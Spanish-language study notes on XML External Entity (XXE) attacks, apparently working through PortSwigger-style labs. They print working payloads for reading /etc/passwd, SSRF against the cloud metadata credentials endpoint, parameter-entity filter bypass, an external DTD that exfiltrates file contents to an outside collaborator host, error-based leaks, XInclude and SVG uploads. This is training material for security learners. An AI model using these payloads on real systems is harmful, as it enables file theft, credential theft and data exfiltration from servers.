------
### QUE ES?
Un **XXE (XML External Entity)** es una vulnerabilidad que afecta a aplicaciones que procesan datos en formato XML.  
Ocurre cuando el parser XML permite la definición de **entidades externas**, lo que puede ser explotado para acceder a archivos internos del sistema o realizar peticiones hacia otros recursos.  
Permite cosas como leer archivos locales (por ejemplo `/etc/passwd`), realizar SSRF o provocar denegaciones de servicio.  
Se previene deshabilitando las entidades externas en el parser XML y utilizando configuraciones seguras por defecto.

Una **entidad externa** en XML es una referencia que apunta a un **recurso externo al propio documento XML**, como:
- Un archivo local del sistema
- Una URL remota
- Otro recurso accesible desde el servidor
Se define dentro del DTD usando `SYSTEM` (o `PUBLIC`).
#### PASOS: 
- *BUSCAR PARTES DE CODIGO QUE PROCESEN XML*
- *PROBAR ENTIDADES NORMALES SI LAS BLOQUEA PASAR A PARAMETER*
- *SI NO DEVUELVE NADA NI ERRORE PROBAR BLIND OOB*
- *COMPROBAR XINCLUDE POR SI EL SERVIDOR METE EL INPUT DENTRO DE UN XML*

### LAB1: EXPLOITING XXE USING EXTERNAL ENTITIES TO RETRIEVE FILES
En este lab el servidor procesa datos en formato *XML* en la funcionalidad de **check stock**.  
Al interceptar la petición con *Burp*, comprobamos que el backend parsea XML sin restricciones.

Definimos una entidad externa dentro del DOCTYPE:
`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`

Y hacemos que lo muestre:
`&xxe;`

`<!DOCTYPE test [...]>`  
Declara un **DTD (Document Type Definition)** dentro del XML.  
El DTD permite definir reglas y entidades que el parser interpretará al procesar el documento.

`<!ENTITY xxe SYSTEM "file:///etc/passwd">`  
Define una **entidad externa** llamada `xxe`.
- `ENTITY xxe` → crea una entidad con el nombre `xxe`.
- `SYSTEM` → indica que la entidad hace referencia a un recurso externo.
- `"file:///etc/passwd"` → especifica que ese recurso externo es un archivo local del sistema.

### LAB2: EXPLOITING XXE TO PERFORM SSRF ATTACKS
En este lab el servidor procesa datos en formato *XML* en la funcionalidad de **check stock**.  
Al interceptar la petición con *Burp*, comprobamos que el backend parsea XML sin restricciones y permite entidades externas.

Definimos una entidad externa dentro del DOCTYPE
Aquí no estamos intentando leer un archivo local, sino hacer que el servidor realice una **petición HTTP interna** a: `"http://169.254.169.254/"`
`<?xml version="1.0" encoding="UTF-8"?>`
`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
`<stockCheck>
	`<productId>&xxe;</productId>
	`<storeId>&xxe;</storeId>
`</stockCheck>
Nos aparecera un mensaje de error pero este contiene los nombres de las carpetas, solo hay que seguir añadiendolas hasta llegar a las creds.
De esta manera realizamos un **SSRF (Server-Side Request Forgery)**.

### LAB3: BLIND XXE WITH OUT-OF-BAND INTERACTION
**Out-of-Band** significa “fuera del canal principal de comunicación”.
En seguridad, se refiere a cuando la información no vuelve en la **respuesta directa de la aplicación**, sino que se envía por **otro canal distinto**.

En este lab el servidor procesa datos en formato *XML* en la funcionalidad de **check stock**.  
Al interceptar la petición con *Burp*, comprobamos que el backend parsea XML sin restricciones y permite entidades externas..
`<?xml version="1.0" encoding="UTF-8"?>`
`<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>`
`<stockCheck>
	`<productId>&xxe;</productId>
	`<storeId>&xxe;</storeId>
`</stockCheck>
Se puede injectar el subdominio de *burp collaborator* con click derecho **"Insert Collaborator Payload"**.

### LAB4: BLIND XXE WITH OUT-OF-BAND INTERACTION VIA XML PARAMETER ENTITIES
#### Qué es una parameter entity?
- Se define con `%` en vez de con un nombre normal.
- Solo puede usarse dentro del DTD.
- Se referencia como `%xxe;`.
- Se procesa durante la interpretación del DTD.
Muchos filtros bloquean entidades normales pero no parameter entities → bypass clásico.

En este lab el servidor procesa datos en formato *XML* en la funcionalidad de **check stock** pero no muestra valores inesperados y 
bloquea las request que contiene *entidades externas* regulares.

En este lab tenemos que definir una **parameter entity**, que se procesa dentro del DTD antes que el resto del XML:
`<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>`
Cuando el parser procesa el DTD:
1. Ve la definición.
2. Intenta resolver la entidad.
3. Hace una petición HTTP al dominio del Burp Collaborator.
4. Tú recibes esa petición → confirmación de vulnerabilidad.
Se puede injectar el subdominio de *burp collaborator* con click derecho **"Insert Collaborator Payload"**.
### LAB5: EXPLOITING BLIND XXE TO EXFILTRATE DATA USING A MALICIOUS EXTERNAL DTD
El servidor procesa datos en formato **XML** en la funcionalidad de **check stock**, pero:
- No muestra resultados en la respuesta (Blind).
- No permite exfiltración directa en la respuesta HTTP.
Por tanto, necesitamos usar **Out-of-Band (OOB)** para extraer información.

En el **Exploit Server**, creamos un archivo :
`<!ENTITY % file SYSTEM "file:///etc/hostname">  
`<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">  
`%eval;  
`%exfil;

Aquí definimos una **parameter entity** llamada `%file`.
Cuando el parser la procese sustituirá `%file;` por el contenido real de `/etc/hostname``
Construimos la **parameter entity** principal : `<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP...?x=%file;'>">
Dentro de esa cadena estamos creando otra entity: `<!ENTITY % exfil SYSTEM "http://BURP...?x=VALOR_DEL_ARCHIVO">`, pero como estamos dentro de una definición el `% = &#x25;'
Tras esto evaluamos o "ejecutamos la principal" `%eval`
Y una vez que existe `%exfil` 
*RESUMEN* El servidor:
1. Lee el archivo local.
2. Mete su contenido en una URL.
3. Hace una petición saliente hacia ti.
4. Te envía el contenido sin que la aplicación lo muestre en pantalla.

Ahora para referenciar el *DTD* desde la request:
`<?xml version="1.0" encoding="UTF-8"?>  
`<!DOCTYPE foo [  <!ENTITY % xxe SYSTEM "YOUR-DTD-URL">  %xxe;  ]>  
`<stockCheck>  
	`<productId>1</productId>  
	`<storeId>1</storeId>  
`</stockCheck>
Esto obliga al servidor a:
1. Descargar el DTD externo.
2. Procesarlo.
3. Ejecutar las entities.
4. Exfiltrar el archivo hacia Burp Collaborator.

### LAB6: EXPLOITING BLIND XXE TO RETRIEVE DATA VIA ERROR MESSGES
El servidor procesa datos en formato **XML** en la funcionalidad de **check stock**:
- No muestra directamente el resultado del XML.
- Pero sí devuelve **mensajes de error del parser**.

En el **Exploit Server** creamos un archivo con:
`<!ENTITY % file SYSTEM "file:///etc/passwd">
`<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
`%eval;
`%exfil;
Definimos `%file`, que contendrá el contenido real de `/etc/passwd`.
Contruimos dinamicamente las entidades y le decimos al parser que cargue un archivo que NO EXISTE: `file:///invalid/<contenido real del passwd>`
Al cargar el parser genera un error del tipo:

> File not found: /invalid/root:x:0:0:root:...

Funciona porque lo que estamos mostrando es el error y el error contiene el */etc/passwd* no la ruta al */etc/passwd*

En la request interceptada en *Burp* añadimos:
`<?xml version="1.0" encoding="UTF-8"?>
`<!DOCTYPE xxe [ <!ENTITY % xxe SYSTEM "https://exploit-0aae0028038b0600810c8d1901b100ed.exploit-server.net/exploit"> %xxe; ]>
`<stockCheck>
	 `<productId>1</productId>
	 `<storeId>1</storeId>
`</stockCheck>
Esto hace que el servidor:
1. Descargue el DTD externo.
2. Procese las entities.
3. Intente abrir la ruta inválida.
4. Devuelva el error con el contenido del archivo.
### LAB7: EXPLOITING XINCLUDE TO RETRIEVE FILES
El laboratorio tiene una funcionalidad **"Check stock"** que inserta el input del usuario dentro de un documento **XML del lado del servidor**, que posteriormente es parseado.
En este caso:
- No controlamos el documento XML completo.
- No podemos definir un `<!DOCTYPE>`.
- No podemos lanzar un XXE clásico.
#### ¿QUÉ ES XINCLUDE?
**XInclude** es una funcionalidad del estándar XML que permite incluir contenido externo dentro de un documento XML.
Si el parser tiene XInclude habilitado, podemos abusarlo para incluir archivos locales.

`productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1`
- `xmlns:xi="http://www.w3.org/2001/XInclude"` → Declara el namespace necesario para usar XInclude con el prefijo `xi:`.
- `<xi:include href="file:///etc/passwd"/>` → Le dice al parser que incluya el contenido del archivo local `/etc/passwd`.
- `parse="text"` → Por defecto, XInclude intenta interpretar el recurso como XML. Como `/etc/passwd` **no es XML válido**, necesitamos indicarlo 

### LAB8: EXPLOITING XXE VIA IMAGE FILE UPLOAD
En este lab la aplicación permite subir **avatares en los comentarios** y utiliza la librería **Apache Batik** para procesar las imágenes.
Punto clave:
- El formato **SVG es XML**.
- Apache Batik parsea el SVG del lado del servidor.
- Si el parser permite entidades externas → es vulnerable a XXE.

Creamos un archivo `payload.svg` con este contenido:
`<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`

Definimos una entidad externa: `<!ENTITY xxe SYSTEM "file:///etc/hostname">`
Esto indica que `&xxe;` será reemplazado por el contenido real del archivo `/etc/hostname`.
Insertamos la entity dentro del SVG `<text font-size="16" x="0" y="16">&xxe;</text>

Cuando el parser procese el SVG:
- Resolverá la entidad.
- Sustituirá `&xxe;` por el hostname.
- Dibujará el contenido dentro de la imagen.

La subimos al avatar y al visitar nuestro comentario → veremos ell `/etc/passwd`
# Flujo real en pentest:

Siempre el orden lógico es:
1. Detectar XML.
2. Probar entity simple.
3. Probar Collaborator simple.
4. Si está filtrado → parameter entity.
5. Si es blind y quiero datos → DTD externo.